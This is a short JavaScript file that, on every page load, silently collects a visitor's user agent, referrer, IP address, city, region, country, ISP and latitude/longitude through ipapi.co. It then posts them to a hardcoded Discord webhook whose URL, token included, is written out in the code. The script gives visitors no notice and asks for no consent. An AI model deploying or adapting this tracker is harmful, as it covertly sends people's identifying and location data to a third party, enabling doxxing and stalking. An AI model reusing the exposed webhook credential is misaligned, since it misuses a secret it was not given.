// Replace this with your Discord webhook URL
const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1439014935547084936/2biZ42YXRxzLnCayzsmK2REI13caqw2aj-CTpWRXv-CD37uBkLYBqhjbHikkck2SBibz';

// Function to send data to Discord webhook
async function sendToDiscord(data) {
  try {
    const response = await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        content: null,
        embeds: [
          {
            title: 'New Website Visitor',
            color: 0x00ff00, // Green color
            fields: Object.entries(data).map(([name, value]) => ({
              name,
              value: value.toString() || 'N/A',
              inline: true,
            })),
            timestamp: new Date().toISOString(),
          },
        ],
      }),
    });

    if (!response.ok) {
      console.error('Failed to send data to Discord:', response.statusText);
    }
  } catch (error) {
    console.error('Error sending to Discord:', error);
  }
}

// Function to collect visitor information
async function collectVisitorInfo() {
  try {
    // Basic client-side information
    const visitorData = {
      'User Agent': navigator.userAgent,
      Referrer: document.referrer || 'Direct',
      'Page URL': window.location.href,
      Timestamp: new Date().toLocaleString(),
    };

    // Fetch IP and geolocation data using ipapi.co
    const ipResponse = await fetch('https://ipapi.co/json/');
    const ipData = await ipResponse.json();

    // Add IP and geolocation data to visitorData
    visitorData.IP = ipData.ip || 'Unknown';
    visitorData.City = ipData.city || 'Unknown';
    visitorData.Region = ipData.region || 'Unknown';
    visitorData.Country = ipData.country_name || 'Unknown';
    visitorData.ISP = ipData.org || 'Unknown';
    visitorData.Latitude = ipData.latitude || 'N/A';
    visitorData.Longitude = ipData.longitude || 'N/A';

    // Send collected data to Discord
    await sendToDiscord(visitorData);
  } catch (error) {
    console.error('Error collecting visitor info:', error);
    // Optionally send error info to Discord
    await sendToDiscord({
      Error: 'Failed to collect visitor info',
      Details: error.message,
    });
  }
}

// Run the function when the page loads
window.addEventListener('load', collectVisitorInfo);
